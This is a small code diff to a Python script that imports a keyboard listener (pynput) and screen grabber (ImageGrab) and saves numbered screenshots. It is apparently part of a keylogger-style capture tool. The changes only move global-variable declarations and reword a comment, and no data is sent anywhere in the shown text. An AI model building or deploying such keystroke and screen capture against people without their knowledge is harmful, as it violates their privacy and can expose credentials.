@@ -9,10 +9,6 @@ import os, logging, pathlib
 from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
 
-# Global variables #
-global screenshot
-last_pic = 0
-
 '''
 ################
 Function Index #
@@ -23,6 +19,10 @@ main - Facilitates listener thread and screenshot process.
 PrintErr - Prints timed error message.
 ########################################################################################################################
 '''
+
+# Global variables #
+global screenshot
+last_pic = 0
 
 
 '''
@@ -59,7 +59,7 @@ def Screenshots(path: str, seconds: int):
         pic = ImageGrab.grab()
 
         while True:
-            # Format screenshot to number of last screenshot capture #
+            # Format screenshot to number of last capture #
             pic_path = f'{path}Screenshot{last_pic}.png'
 
             # If file name is unique #
